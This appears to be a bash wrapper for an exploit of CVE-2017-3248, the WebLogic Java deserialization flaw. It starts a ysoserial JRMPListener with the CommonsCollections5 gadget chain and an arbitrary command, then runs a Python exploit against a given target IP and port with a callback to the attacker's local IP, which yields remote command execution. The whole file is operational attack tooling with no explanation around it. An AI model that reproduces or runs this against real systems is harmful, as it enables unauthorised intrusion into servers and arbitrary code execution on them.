#!/usr/bin/env bash

IP=$1
PORT=$2
LOCALIP=$3
CMD=$4

PID=$(ps -e | pgrep -f '3412 CommonsCollections5')
sudo kill -9 $PID 2> /dev/null

java -cp ../ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 3412 CommonsCollections5 "'${CMD}'" & 
sleep 4
yes | python2.7 exploit-cve-2017-3248.py -t $IP -p $PORT  --ysopath ../ysoserial-0.0.6-SNAPSHOT-BETA-all.jar --jip $LOCALIP --cmd "${CMD}"

PID=$(ps -e | pgrep -f '3412 CommonsCollections5')
sudo kill -9 $PID 2> /dev/null